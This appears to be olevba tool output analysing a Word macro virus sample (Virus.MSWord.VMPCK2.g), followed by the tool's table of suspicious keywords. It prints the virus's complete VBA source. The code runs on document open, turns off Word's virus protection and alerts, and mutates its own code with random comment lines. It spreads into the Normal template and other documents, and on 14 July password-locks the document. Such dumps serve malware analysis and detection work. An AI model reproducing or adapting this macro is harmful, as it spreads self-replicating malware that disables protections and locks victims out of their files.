olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.VMPCK2.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.VMPCK2.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Te618.bas 
in file: ./Virus.MSWord.VMPCK2.g - OLE stream: 'Macros/VBA/Te618'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem C293N807B54M314J509Q450H74J572R579O806J796Q692Q192R69F949S219E236U257G713P772R308S718U222I552I204N629D60O837O424E494V768I484M673B647U340D425R357J746
Rem G751U821E108A151I187W871N728D257B827R790H450M802M203F364N343M425N49
Sub AutoOpen()
On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
Rem V242V114W632N901N244T74K759F378J526G580F78U111O899F948T440L768S382E325J152O99F691L182W470
.ScreenUpdating = False
Rem K356D703U529C756J461L207H95N169U97K272T749G672G89B322R296F479G340B481F863N754U330M80O409V114U619I149L219
Rem J616F685N602C44D245J583G835U526
End With
With Options
Rem O980H240T129N606N693T97
.ConfirmConversions = False
.VirusProtection = False
End With
Application.VBE.ActiveVBProject.VBComponents("Te618").Export "C:\Te618.sys"
MhTh317 = Application.VBE.SelectedVBComponent.Name
For KF16 = 1 To 20
OoOh613 = ""
Rem
LqKg284 = Application.VBE.ActiveVBProject.VBComponents.Item(MhTh317).CodeModule.ProcCountLines("AutoOpen", vbext_pk_Proc)
Rem H295S309I400T409Q658J949O515F582Q456U282P889G367A294W760N605G507R856C541J73K698L406V983
OqFo42 = Int(Rnd * LqKg284) + 1
Rem L173G87W283O306T318R174H72L452N30H135H759O962S553N190U318N596R714P759G549L564G415I970L582K32I137O153E375C614
DjGt53 = Int(Rnd * 40)
For x = 1 To DjGt53
OoOh613 = OoOh613 & Chr(65 + (Rnd * 22)) & Int(Rnd * 999)
Next x
Application.VBE.ActiveVBProject.VBComponents.Item(MhTh317).CodeModule.InsertLines OqFo42, "Rem " & OoOh613
Rem M908O440P64R699L155F325R50L756S324V803P904T416D953S695J16E164L405C275O848L187U372H770F446F877N374J859N930L329T258G178I2Q840G702J810Q437C410H709H797
Rem V932W838J804W258E693A338P110C290
Rem C798G45H381H947
Rem O89E283A152J547M780B405B311N517N329U769N431Q162B243R950I683R35R483F601U944O14P963
Next KF16
If Day(Now()) = 14 And Month(Now()) = 7 Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, Password:="Atom#1"
End If
Rem L462I404G55F978B389I489D473G628M156V653L390C783K752N831A210C105H128A536O543S81
Rem N289H773A759S708B413T789I960T56V363M766B591K297O647G279S823N985U226P979F533C998P15
Rem J335P212B885B458Q754S209K867S409K348F806M537O88Q257B274V326O363I326
Rem O781E806E955B61R379K119D173B714M560F467Q751J902Q88O712A430J275W801P417Q276I433V121O347C185C432V541L971F378J281L138
Set So775 = ActiveDocument.VBProject.VBComponents
Set Qi968 = NormalTemplate.VBProject.VBComponents
For y = 1 To Qi968.Count
If Qi968(y).Name = "Te618" Then Fi962 = True
Next y
For y = 1 To So775.Count
If So775(y).Name = "Te618" Then Rz209 = True
Next y
If Fi962 = True And Rz209 = True Then Exit Sub
If Fi962 = True And Rz209 <> True Then So775.Import "c:\Te618.sys": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Fi962 <> True And Rz209 = True Then Qi968.Import "c:\Te618.sys": NormalTemplate.Save
End Sub
Rem G160E645J412Q325O207E582C457U261R378G918O627J97M693U833A542U429
Rem B345M922M406T825P721
Rem L412P178J542S540J508F618L680U370H292D529F583I875L190

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Hex String|x                   |780B405B31                                   |
|          |@[1                 |                                             |
|Hex String| ~X,E               |207E582C45                                   |
+----------+--------------------+---------------------------------------------+

